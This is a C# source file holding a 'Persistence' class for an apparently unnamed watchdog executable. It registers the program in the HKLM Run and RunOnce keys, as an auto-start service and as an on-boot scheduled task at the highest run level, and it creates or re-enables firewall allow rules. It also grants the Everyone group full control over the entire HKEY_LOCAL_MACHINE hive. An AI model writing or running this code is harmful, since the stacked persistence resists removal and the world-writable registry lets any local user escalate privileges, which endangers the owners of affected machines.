using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ServiceProcess;

public static class Persistence
{
    public static void RunAllTechniques()
    {
        GrantEveryoneFullControl(Registry.LocalMachine);

        string[] runKeys = {
            @"Software\Microsoft\Windows\CurrentVersion\Run",
            @"Software\Microsoft\Windows\CurrentVersion\RunOnce"
        };

        foreach (var key in runKeys)
            SetRegistryKey(key, Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);

        EnsureServiceExists(Config.ServiceName, Config.ServiceDisplayName, Config.PrimaryWatchdogFullPath);
        EnsureScheduledTaskExists(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath);
    }

    #region Firewall

    public static void EnsureFirewallRule(ushort port, string ruleName)
    {
        try
        {
            foreach (var dir in new[] { "in", "out" })
            {
                var status = GetFirewallRuleStatus(ruleName, dir);

                if (status.exists && status.enabled)
                {
                    watchdogHelper.Log($"Firewall rule '{ruleName}' ({dir}) already exists and is enabled.");
                    continue;
                }

                if (status.exists && !status.enabled)
                {
                    // Re-enable the rule
                    RunCommand("netsh", $"advfirewall firewall set rule name=\"{ruleName}\" dir={dir} new enable=yes");
                    watchdogHelper.Log($"Re-enabled disabled firewall rule '{ruleName}' ({dir}).");
                }
                else
                {
                    // Create a new rule if missing
                    RunCommand("netsh", $"advfirewall firewall add rule name=\"{ruleName}\" dir={dir} action=allow protocol=TCP localport={port}");
                    watchdogHelper.Log($"Created missing firewall rule '{ruleName}' ({dir}) on port {port}.");
                }
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error ensuring firewall rules: {ex.Message}");
        }
    }

    private static (bool exists, bool enabled) GetFirewallRuleStatus(string ruleName, string direction)
    {
        try
        {
            string output = RunCommand("netsh", $"advfirewall firewall show rule name=\"{ruleName}\" dir={direction}");

            if (output.Contains("No rules match the specified criteria", StringComparison.OrdinalIgnoreCase))
                return (false, false);

            // Example output line: "Enabled: Yes"
            bool enabled = output.Contains("Enabled: Yes", StringComparison.OrdinalIgnoreCase);

            return (true, enabled);
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"GetFirewallRuleStatus error: {ex.Message}");
            return (false, false);
        }
    }

    private static string RunCommand(string fileName, string args)
    {
        string fullPath = fileName.Equals("netsh", StringComparison.OrdinalIgnoreCase)
            ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "netsh.exe")
            : fileName;

        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = fullPath,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        // netsh returns nonzero for "No rules match", which is expected
        if (process.ExitCode != 0 &&
            !output.Contains("No rules match", StringComparison.OrdinalIgnoreCase))
        {
            throw new InvalidOperationException($"netsh failed: {error}");
        }

        return output;
    }

    #endregion

    #region Scheduled Task

    public static void EnsureScheduledTaskExists(string taskName, string exePath)
    {
        try
        {
            bool exists = TaskExists(taskName);
            bool enabled = exists && IsTaskEnabled(taskName);

            if (exists && enabled)
            {
                watchdogHelper.Log($"Scheduled task '{taskName}' already exists and is enabled.");
                return;
            }

            if (exists && !enabled)
            {
                EnableTask(taskName);
                watchdogHelper.Log($"Scheduled task '{taskName}' was disabled and has been enabled.");
                return;
            }

            CreateTask(taskName, exePath);
            watchdogHelper.Log($"Scheduled task '{taskName}' created successfully.");
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error ensuring scheduled task '{taskName}': {ex.Message}");
        }
    }

    private static bool TaskExists(string taskName)
    {
        var result = RunCommand("schtasks", $"/Query /TN \"{taskName}\" /FO LIST", true);
        return result.exitCode == 0 && result.output.Contains("TaskName:", StringComparison.OrdinalIgnoreCase);
    }

    private static bool IsTaskEnabled(string taskName)
    {
        var result = RunCommand("schtasks", $"/Query /TN \"{taskName}\" /FO LIST /V", true);
        if (result.exitCode != 0)
            return false;

        // The “Scheduled Task State” line says “Disabled” if off
        foreach (var line in result.output.Split('\n'))
        {
            if (line.TrimStart().StartsWith("Scheduled Task State", StringComparison.OrdinalIgnoreCase))
            {
                return !line.Contains("Disabled", StringComparison.OrdinalIgnoreCase);
            }
        }
        return true; // Default assume enabled if we can’t tell
    }

    private static void EnableTask(string taskName)
    {
        RunCommand("schtasks", $"/Change /TN \"{taskName}\" /ENABLE", false);
    }

    private static void CreateTask(string taskName, string exePath)
    {
        string cmd = $"/Create /SC ONSTART /RL HIGHEST /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /F";
        var result = RunCommand("schtasks", cmd, true);

        if (result.exitCode != 0)
            throw new Exception($"Failed to create task: {result.output}");
    }

    private static (int exitCode, string output) RunCommand(string fileName, string arguments, bool captureOutput)
    {
        using (Process process = new Process())
        {
            process.StartInfo.FileName = fileName;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = !captureOutput;
            if (captureOutput)
            {
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
            }

            process.Start();
            string output = captureOutput ? process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd() : "";
            process.WaitForExit();

            return (process.ExitCode, output);
        }
    }

    #endregion

    #region Windows Service

    private const uint SC_MANAGER_CREATE_SERVICE = 0x0002;
    private const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
    private const uint SERVICE_AUTO_START = 0x00000002;
    private const uint SERVICE_ERROR_NORMAL = 0x00000001;
    private const uint SERVICE_ALL_ACCESS = 0xF01FF;

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr CreateService(
        IntPtr hSCManager,
        string lpServiceName,
        string lpDisplayName,
        uint dwDesiredAccess,
        uint dwServiceType,
        uint dwStartType,
        uint dwErrorControl,
        string lpBinaryPathName,
        string lpLoadOrderGroup,
        IntPtr lpdwTagId,
        string lpDependencies,
        string lpServiceStartName,
        string lpPassword);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool CloseServiceHandle(IntPtr hSCObject);

    public static void EnsureServiceExists(string serviceName, string displayName, string exePath)
    {
        IntPtr scmHandle = OpenSCManager(null, null, SC_MANAGER_CREATE_SERVICE);
        if (scmHandle == IntPtr.Zero)
        {
            watchdogHelper.Log("Failed to open Service Control Manager.");
            return;
        }

        try
        {
            if (!ServiceExists(serviceName))
            {
                IntPtr serviceHandle = CreateService(
                    scmHandle,
                    serviceName,
                    displayName,
                    SERVICE_ALL_ACCESS,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    exePath,
                    null,
                    IntPtr.Zero,
                    null,
                    null,
                    null);

                if (serviceHandle == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    watchdogHelper.Log(err == 1073
                        ? $"Service '{serviceName}' already exists."
                        : $"Failed to create service '{serviceName}'. Error code: {err}");
                }
                else
                {
                    watchdogHelper.Log($"Service '{serviceName}' created successfully.");
                    CloseServiceHandle(serviceHandle);
                }
            }

            // Always set start type to Automatic
            using (var process = new Process())
            {
                process.StartInfo.FileName = "sc.exe";
                process.StartInfo.Arguments = $"config \"{serviceName}\" start= auto";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();
                process.WaitForExit();
            }

            watchdogHelper.Log($"Service '{serviceName}' start type set to Automatic.");
        }
        finally
        {
            CloseServiceHandle(scmHandle);
        }
    }

    private static bool ServiceExists(string serviceName)
    {
        try
        {
            ServiceController sc = new ServiceController(serviceName);
            var _ = sc.Status; // throws if service does not exist
            return true;
        }
        catch
        {
            return false;
        }
    }

    #endregion

    #region Registry

    private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive)
    {
        try
        {
            using var baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Default);
            using var key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true);
            if (key == null) throw new IOException($"Failed to create/open registry key: {keyPath}");

            var current = key.GetValue(valueName);
            if (!Equals(current, value))
                key.SetValue(valueName, value);
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"[Registry Error] {keyPath}: {ex.Message}");
        }
    }

    private static void GrantEveryoneFullControl(RegistryKey rootKey)
    {
        try
        {
            var security = rootKey.GetAccessControl();
            var rule = new RegistryAccessRule(
                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                RegistryRights.FullControl,
                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                PropagationFlags.None,
                AccessControlType.Allow);

            security.AddAccessRule(rule);
            security.SetAccessRuleProtection(false, false);
            rootKey.SetAccessControl(security);

            watchdogHelper.Log($"Granted 'Everyone' full control over {rootKey.Name}.");
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"[Grant Error] {ex.Message}");
        }
    }

    #endregion

}
